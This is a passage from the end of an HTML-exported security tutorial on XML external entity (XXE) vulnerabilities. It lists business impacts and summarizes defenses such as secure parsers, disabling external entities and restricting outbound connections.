class="bulleted-list"><li style="list-style-type:disc"><strong>Reputation</strong>: Loss of customer trust</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d6-a97c-d7fc5f0986c9" class="bulleted-list"><li style="list-style-type:disc"><strong>Legal</strong>: GDPR/regulatory violations</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8053-805a-ca53cf8d51c6" class="bulleted-list"><li style="list-style-type:disc"><strong>Operational</strong>: System compromise, data loss</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80a7-922d-fbebbb4da6ac"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80f8-a2da-de45c4c9661f" class=""><strong>Summary</strong></h2></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806d-937a-ebe9f5da4cc8" class="">XXE is a critical vulnerability affecting XML processing. Key points:</p></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-80d3-b8fb-d4c7c4da4eb7" class="numbered-list" start="1"><li><strong>Always use secure XML parsers</strong> - defusedxml, or configure parsers securely</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-808c-8569-ddfc78b93ea5" class="numbered-list" start="2"><li><strong>Disable external entities</strong> - Primary defense against XXE</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8060-9d86-c2911c8dc115" class="numbered-list" start="3"><li><strong>Validate XML input</strong> - Reject DOCTYPE declarations when possible</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-80ef-94c2-f4af69f53674" class="numbered-list" start="4"><li><strong>Use JSON when possible</strong> - Simpler and safer alternative</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8007-accc-f87f30db8839" class="numbered-list" start="5"><li><strong>Restrict network access</strong> - Limit outbound connections</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-801c-ad07-d10ad3fd18ab" class="numbered-list" start="6"><li><strong>Follow defense in depth</strong> - Multiple layers of protection</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-809b-959b-f72821aabc93" class="numbered-list" start="7"><li><strong>Test thoroughly</strong> - Code reviews, SAST/DAST scanning</li></ol></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-804e-92a6-d8dbcdd9cc22" class="">Remember: <strong>XXE is prevented by using secure XML parsers with external entities disabled, not by input validation alone!</strong></p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
